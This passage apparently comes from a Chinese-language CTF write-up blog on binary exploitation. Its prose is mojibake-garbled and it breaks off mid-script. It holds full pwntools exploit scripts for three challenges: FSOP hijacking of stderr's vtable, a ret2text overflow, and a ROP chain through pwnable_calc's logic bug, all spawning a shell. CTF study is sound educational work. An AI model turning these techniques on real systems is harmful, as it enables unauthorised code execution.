<h3 id="è§£æ³•äºŒï¼šFile-Stream-Oriented-Programme"><a href="#è§£æ³•äºŒï¼šFile-Stream-Oriented-Programme" class="headerlink" title="è§£æ³•äºŒï¼šFile Stream Oriented Programme"></a>è§£æ³•äºŒï¼šFile Stream Oriented Programme</h3><p>ç”±äºglibc2.23ä¸­æœªåŠ å…¥å¯¹vtableè¡¨çš„åˆæ³•æ€§æ£€æµ‹ï¼Œæ•…æˆ‘ä»¬å¯ä»¥è€ƒè™‘ç›´æ¥åŠ«æŒ<code>_IO_2_1_stderr_</code>åŠå…¶vtableè¡¨æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>ä»¥get shellï¼ˆstderrä¸ºFILEé“¾è¡¨çš„å¤´ç»“ç‚¹ï¼‰ï¼Œå…¶ä¸­ç”±äº<code>__overflow()</code>å‡½æ•°ä¼šå°†æŒ‡å‘FILEçš„æŒ‡é’ˆä½œä¸ºå…¶ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ•…è€ƒè™‘å°†â€&#x2F;bin&#x2F;shâ€å­—ç¬¦ä¸²æ„é€ äºfake fileçš„å¼€å¤´</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_7&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;, 26348)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;)#</span></span><br><span class="line">one_gadget = <span class="number">0xf1147</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>((p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>)), <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice-&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Input string Length: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x100</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Author name:&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span> + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh\x00&quot;</span> <span class="comment"># _flags, an magic number</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_read_base</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_base</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])<span class="comment"># _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_buf_base;</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">4</span> <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]) <span class="comment"># the FILE chain ptr</span></span><br><span class="line">fake_file += p32(<span class="number">2</span>) <span class="comment"># _fileno for stderr is 2</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>) <span class="comment"># _flags2, usually 0</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _old_offset, -1</span></span><br><span class="line">fake_file += p16(<span class="number">0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span> <span class="comment"># _vtable_offset</span></span><br><span class="line">fake_file += <span class="string">b&quot;\n&quot;</span> <span class="comment"># _shortbuf[1]</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1ea0</span>) <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _offset, -1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x160</span>) <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">fake_file += p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode, usually -1</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span> <span class="comment"># _unused2</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># adjust to vtable</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0x10</span>) <span class="comment"># fake vtable</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice-&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;New Author name:&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;New contents:&quot;</span>)</span><br><span class="line">p.send(fake_file)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/01/31/HItF2WqQlb6kyTZ.png"></p>
<blockquote>
<h4 id="exit-å‡½æ•°ä¸FSOPç›¸å…³â€¦"><a href="#exit-å‡½æ•°ä¸FSOPç›¸å…³â€¦" class="headerlink" title="exit()å‡½æ•°ä¸FSOPç›¸å…³â€¦"></a>exit()å‡½æ•°ä¸FSOPç›¸å…³â€¦</h4><blockquote>
<p> ç”±äºç¨‹åºé€€å‡ºæ—¶å¿…å®šä¼šè°ƒç”¨<code>exit()</code>å‡½æ•°ï¼Œæ•…æˆ‘ä»¬è¦å¯¹è¿™ä¸ªå‡½æ•°å¤šå¤šä¸Šå¿ƒ2333</p>
</blockquote>
<p>æˆ‘ä»¬ä¸éš¾è§‚å¯Ÿåˆ°åœ¨<code>exit()</code>å‡½æ•°å½“ä¸­è¿˜ä¼šè°ƒç”¨<code> _IO_flush_all_lockp ()</code>å‡½æ•°</p>
<p><img src="https://i.loli.net/2021/01/30/x3I8sHJpvRqmajM.png"></p>
<p>è¯¥å‡½æ•°ä¼šåˆ·æ–°_IO_list_allé“¾è¡¨ä¸­æ‰€æœ‰é¡¹çš„æ–‡ä»¶æµ ï¼Œå®šä¹‰äºlibio&#x2F;genops.cä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å…¶ä¸­çš„å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä¸­é—´çš„é‚£ä¸€æ®µå®ä¸€èˆ¬ä¸ºå‡ï¼Œæˆ‘ä»¬æš‚ä¸”å…ˆä¸ç®¡</p>
</blockquote>
<p>é‚£ä¹ˆå…¶ä¼šæ£€æŸ¥å¦‚ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š</p>
<ul>
<li><strong>fp-&gt;_mode &lt;&#x3D; 0</strong></li>
<li><strong>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</strong></li>
</ul>
<p>æŒ‰ç…§ç¨‹åºæ‰§è¡Œæµç¨‹ï¼Œåœ¨è¿™ä¸¤ä¸ªæ¡ä»¶é€šè¿‡ä¹‹åä¾¿ä¼šä½¿ç”¨å®<code>_IO_OVERFLOW()</code>ï¼Œå…¶å®šä¹‰äºlibio&#x2F;libioP.hä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure>

<p>ç”±æ­¤å¯çŸ¥å…¶<strong>æœ€ç»ˆä¼šè°ƒç”¨vtableè¡¨ä¸­çš„</strong><code>__overflow</code><strong>å‡½æ•°ï¼Œä¸”ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæŒ‡å‘FILEè‡ªèº«çš„æŒ‡é’ˆ</strong></p>
</blockquote>
<blockquote>
<p>ç¬”è€…ä¸ªäººæ¯”è¾ƒå¸¸è§„çš„åšæ³•æ˜¯æŒ‰ç…§FILEçš„ç»“æ„æ„é€ å‡ºä¸€ä¸ªfake fileé¢„å¤‡ç€ç”¨ï¼Œç­‰åˆ°çœŸæ­£è¦åŠ«æŒFILEç»“æ„ä½“çš„æ—¶å€™å¯¹ç…§ç›¸åº”çš„éœ€æ±‚éƒ¨åˆ†æ”¹ä¸€æ”¹åå¤åˆ¶ç²˜è´´å³å¯ï¼Œç›®å‰è€ƒè™‘æœ‰æ—¶é—´å°è£…ä¸€ä¸ªåº“å°±åƒpwntoolsä¸­çš„SigreturnFrame()ä¸€æ ·ï¼ˆ<del>ä½†æ˜¯ä»€ä¹ˆæ—¶å€™æœ‰æ—¶é—´å‘¢æ— é™æ‘¸é±¼è€…A3</del></p>
</blockquote>
<h2 id="0x-mrctf2020-easyrop-ret2text"><a href="#0x-mrctf2020-easyrop-ret2text" class="headerlink" title="0x???.mrctf2020_easyrop - ret2text"></a>0x???.mrctf2020_easyrop - ret2text</h2><blockquote>
<p>ä»æ¯”è¾ƒé åçš„æ— äººåŒºæŒ‘äº†ä¸€é“ç®€å•é¢˜æ¥åš2333ï¼ˆ<del>ä¸ºäº†æ··åˆ†</del></p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/10/07/9iQUjlYXTmzAKoB.png" alt="image.png"></p>
<p>ä¸»å‡½æ•°ä¸­æ ¹æ®æˆ‘ä»¬æ‰€è¾“å…¥çš„æ•°å­—è¿›å…¥ä¸åŒçš„å‡½æ•°ï¼Œè¾“å…¥7åˆ™åœ¨è¿›å…¥ç›¸åº”çš„å‡½æ•°ä¹‹åé€€å‡º</p>
<p><img src="https://i.loli.net/2020/10/07/zrNR46ytfJ2gcDq.png" alt="image.png"></p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨èƒ½å¤Ÿç›´æ¥getshellçš„gadget</p>
<p><img src="https://i.loli.net/2020/10/07/LXQr9f2BShwG1bC.png" alt="image.png"></p>
<p>è™½ç„¶è¯´å‡ ä¸ªå‡½æ•°éƒ½æ˜¯å‘mainä¸­çš„v5ä¸Šå†™å…¥ï¼Œä½†æ˜¯æœ€å¤§çš„ä¸€ä¸ªå‡½æ•°ä»…å¯ä»¥å†™å…¥<code>0x300</code>å­—èŠ‚ï¼Œæº¢å‡ºåˆ°rbpè¦<code>0x310</code>å­—èŠ‚</p>
<p><img src="https://i.loli.net/2020/10/07/wzrb1uSvc49oaeO.png" alt="image.png"></p>
<p>ä¸è¿‡æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œåœ¨<code>byby()</code>å‡½æ•°ä¸­ç¨‹åºä¼šå°†v5çœ‹ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶åœ¨å­—ç¬¦ä¸²æœ«å°¾å¼€å§‹è¯»å…¥ç”¨æˆ·è¾“å…¥</p>
<p><img src="https://i.loli.net/2020/10/07/QDHPlT9WFS3gx6K.png" alt="image.png"></p>
<p>ç”±äº<code>hehe()</code>èƒ½å¤Ÿè¯»å…¥0x300å­—èŠ‚ï¼Œæ•…æˆ‘ä»¬è€ƒè™‘å…ˆä½¿ç”¨<code>hehe()</code>å‡½æ•°æ„é€ ä¸€ä¸ªé•¿åº¦ä¸º0x2ffçš„å­—ç¬¦ä¸²ï¼Œå†è°ƒç”¨<code>byby()</code>å‡½æ•°è¿›è¡Œè¯»å…¥ï¼Œä¾¿å¯ä»¥æº¢å‡ºæ§åˆ¶ä¸»å‡½æ•°çš„è¿”å›åœ°å€è¿”å›è‡³<code>system(&quot;/bin/sh&quot;)</code></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29482</span>)<span class="comment">#process(&#x27;./mrctf2020_easyrop&#x27;)#</span></span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x300</span>-<span class="number">1</span>)+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x11</span>+p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x40072a</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¾—flag</p>
<p><img src="https://i.loli.net/2020/10/07/TwVOht7dcnsZzbN.png" alt="image.png"></p>
<h2 id="0x-pwnable-calc-ret2syscall"><a href="#0x-pwnable-calc-ret2syscall" class="headerlink" title="0x???.pwnable_calc - ret2syscall"></a>0x???.pwnable_calc - ret2syscall</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2021/02/27/boyq1aHJzTXUKsj.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2021/02/27/YIt25sLJcC6krdi.png" alt="image.png"></p>
<p>å¤§æ¦‚æ˜¯æ¨¡æ‹Ÿäº†ä¸€ä¸ªè®¡ç®—å™¨ï¼Œå…¶ä¸­<code>get_expr()</code>ä¸ºè¯»å…¥è¡¨è¾¾å¼ï¼Œ<code>init_pool()</code>ä¸ºåˆå§‹åŒ–æ•°æ®æ ˆ</p>
<p>æ ¸å¿ƒçš„è®¡ç®—å‡½æ•°ä¸º<code>parse_expr()</code>ï¼Œè·Ÿè¿›ï¼ˆéƒ¨åˆ†å˜é‡ç»é‡å‘½å</p>
<p>é€»è¾‘å¤§æ¦‚æ˜¯é€å­—ç¬¦éå†è¾“å…¥çš„è¡¨è¾¾å¼ï¼Œè‹¥é‡åˆ°<code>+ - * / % \0</code>ç­‰ç¬¦å·åˆ™ä¼šå°†æ­¤å‰çš„æœªè¯»éƒ¨åˆ†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—ï¼Œå‹å…¥poolæ•°ç»„ä¸­ï¼ˆå¯ä»¥çœ‹ä½œæ˜¯å­˜æ”¾æ•°æ®çš„æ ˆï¼‰ï¼Œå…¶ä¸­pool[0]ç”¨ä»¥ä¿å­˜å½“å‰æ•°æ®é‡</p>
<p>è¿™é‡Œçš„éªŒè¯é€»è¾‘æ˜¯é€šè¿‡æ•´å‹ä¸Šæº¢å®Œæˆçš„ï¼Œå¹¶ä¸æ˜¯å¾ˆä¸¥å¯†</p>
<p><img src="https://i.loli.net/2021/02/27/zRjMYLVQEcT31Cm.png" alt="image.png"></p>
<p>æ¥ä¸‹æ¥ä¾¿æ˜¯é€šè¿‡è¿ç®—ç¬¦è¿›è¡Œç›¸åº”çš„è®¡ç®—ï¼Œç”±äº<code>* / %</code>ä¼˜å…ˆçº§é«˜äº<code>+ -</code>çš„ç¼˜æ•…ï¼Œè¿™é‡Œè®¾è®¡äº†ä¸€ä¸ªä¸“é—¨ç”¨ä»¥å­˜æ”¾è¿ç®—ç¬¦çš„æ ˆï¼Œè¿ç®—é€»è¾‘å¦‚ä¸‹ï¼š</p>
<ul>
<li>è‹¥æ ˆä¸­æ— è¿ç®—ç¬¦åˆ™ä¼šå°†è¿ç®—ç¬¦å‹å…¥æ ˆä¸­</li>
<li>è‹¥æ ˆä¸­åŸæœ‰è¿ç®—ç¬¦æˆ–æ–°è¿ç®—ç¬¦ä¸ºä½ä¼˜å…ˆçº§è¿ç®—ç¬¦ï¼Œåˆ™ä¼šä½¿ç”¨<code>eval()</code>å‡½æ•°è®¡ç®—åŸæœ‰æ•°æ®ï¼ŒåŒæ—¶å°†æ ˆä¸­åŸè¿ç®—ç¬¦å¼¹å‡ºï¼Œå‹å…¥æ–°è¿ç®—ç¬¦</li>
<li>è‹¥æ ˆä¸­åŸæœ‰è¿ç®—ç¬¦ä¸æ–°è¿ç®—ç¬¦åŒä¸ºé«˜ä¼˜å…ˆçº§è¿ç®—ç¬¦ï¼Œåˆ™ä¼šå°†æ–°è¿ç®—ç¬¦å‹å…¥æ ˆä¸­</li>
<li>è‹¥è¾“å…¥çš„è¿ç®—ç¬¦ä¸ºå…¶ä»–è¿ç®—ç¬¦ï¼ˆéªŒè¯ä¸ä¸¥å¯†ï¼‰ï¼Œåˆ™ä¼šç›´æ¥ä½¿ç”¨<code>eval()</code>å‡½æ•°è®¡ç®—åŸæœ‰æ•°æ®ï¼Œå¼¹å‡ºåŸæœ‰è¿ç®—ç¬¦</li>
</ul>
<p>éå†ç»“æŸåï¼Œè¿ç®—ç¬¦æ ˆä¸­è¿˜å¯èƒ½ç•™æœ‰ä¸€äº›æ•°æ®ï¼Œæ­¤æ—¶å†ä½¿ç”¨å¾ªç¯è¿›è¡Œè®¡ç®—</p>
<p><img src="https://i.loli.net/2021/02/27/cPk5wVTvbxAQ3W1.png" alt="image.png"></p>
<p>ä¸è¿‡åœ¨<code>eval()</code>å‡½æ•°ä¸­å¹¶æ²¡æœ‰å®šä¹‰æ±‚æ¨¡è¿ç®—ï¼Œä¹Ÿå°±æ˜¯è¯´æ±‚æ¨¡è¿ç®—çš„æ¨¡æ•°ä¼šè¢«è‡ªåŠ¨èˆå¼ƒ</p>
<p><img src="https://i.loli.net/2021/02/27/3IQd5wbzG27ZkBP.png" alt="image.png"></p>
<p>é‚£ä¹ˆè¿™é‡Œå°±å­˜åœ¨ä¸€ä¸ªé€»è¾‘æ¼æ´ï¼šè‹¥æ˜¯ç›´æ¥è¾“å…¥è¿ç®—ç¬¦åŠ æ•°å­—ï¼ˆå¦‚<code>+200</code>ï¼‰åˆ™ä¼šç›´æ¥æ”¹å†™num_pool[0]çš„å€¼ï¼Œè€Œæˆ‘ä»¬åœ¨<code>calc()</code>å‡½æ•°ä¸­è¾“å‡ºç»“æœæ—¶ä¾¿æ˜¯è¾“å‡ºçš„<code>num_pool[num_pool[0]]</code>çš„å€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡è¿™ä¸ªé€»è¾‘æ¼æ´<strong>éšæ„æ³„éœ²æ ˆä¸Šæ•°æ®</strong></p>
<p>åŒæ ·åœ°ï¼Œè‹¥æ˜¯æˆ‘ä»¬åœ¨å…¶åå†è·Ÿä¸Šå…¶ä»–è¿ç®—è¡¨è¾¾å¼ï¼Œ<strong>ä¾¿èƒ½å¤Ÿä»»æ„ä¿®æ”¹æ ˆä¸Šçš„å€¼</strong></p>
<p>ç®€å•è®¡ç®—ä¸€ä¸‹ä¾¿çŸ¥é“<code>num_pool[361]</code>çš„ä½ç½®ä¾¿æ˜¯<code>calc()</code>å‡½æ•°çš„è¿”å›åœ°å€</p>
<p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨ä¸Šé¢æ„é€ ropé“¾å³å¯get shell</p>
<p>ä¸è¿‡æˆ‘ä»¬è¿˜éœ€è¦æ‰‹åŠ¨å°†<code>/bin/sh</code>å­—ç¬¦ä¸²å†™åˆ°æ ˆä¸Šï¼Œå¯ä»¥é€šè¿‡æ³„éœ²ebpè·å¾—æ ˆä¸Šåœ°å€åå†™å…¥å³å¯ï¼Œä»¥åŠéœ€è¦è‡ªå·±è®¡ç®—ä¸€ä¸‹åç§»ï¼Œè¿™é‡ŒæŒ‰æˆ‘çš„ropé“¾å¸ƒå±€åˆšå¥½åœ¨åè¾¹æ‰€ä»¥åç§»ä¸º0</p>
<p><img src="https://i.loli.net/2021/02/27/mDfCHcdOiM2S5bA.png" alt="image.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26915</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./calc&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">dst:<span class="built_in">int</span>, val:<span class="built_in">int</span>, op</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(dst) + op + <span class="built_in">str</span>(val))</span><br><span class="line">    p.recv()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">dst:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(dst))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_val</span>(<span class="params">dst:<span class="built_in">int</span>, val:<span class="built_in">int</span></span>):</span><br><span class="line">    n = leak(dst)</span><br><span class="line">    <span class="keyword">if</span> n != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n &gt; <span class="number">0</span>:</span><br><span class="line">            write(dst, n, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> n &lt; <span class="number">0</span>:</span><br><span class="line">            write(dst, -n, <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> val != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> val &gt; <span class="number">0</span>:</span><br><span class="line">            write(dst, val, <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> val &lt; <span class="number">0</span>:</span><br><span class="line">            write(dst, -val, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">pop_eax_ret = e.search(asm(<span class="string">&#x27;pop eax ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_edx_pop_ecx_pop_ebx_ret = e.search(asm(<span class="string">&#x27;pop edx ; pop ecx ; pop ebx ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_ecx_pop_ebx_ret = <span class="number">0x80701d1</span></span><br><span class="line">pop_edx_ret = <span class="number">0x80701aa</span></span><br><span class="line">int_0x80 = e.search(asm(<span class="string">&#x27;int 0x80&#x27;</span>)).__next__()</span><br><span class="line">log.success(<span class="built_in">hex</span>(pop_eax_ret))</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">stack_leak = leak(<span class="number">360</span>)</span><br><span class="line">sh_addr = stack_leak</span><br><span class="line"></span><br><span class="line">set_val(<span class="number">361</span>, pop_eax_ret)</span><br><span class="line">set_val(<span class="number">362</span>, <span class="number">11</span>) <span class="comment"># execve</span></span><br><span class="line">set_val(<span class="number">363</span>, pop_edx_pop_ecx_pop_ebx_ret)</span><br><span class="line">set_val(<span class="number">364</span>, <span class="number">0</span>)</span><br><span class="line">set_val(<span class="number">365</span>, <span class="number">0</span>)</span><br><span class="line">set_val(<span 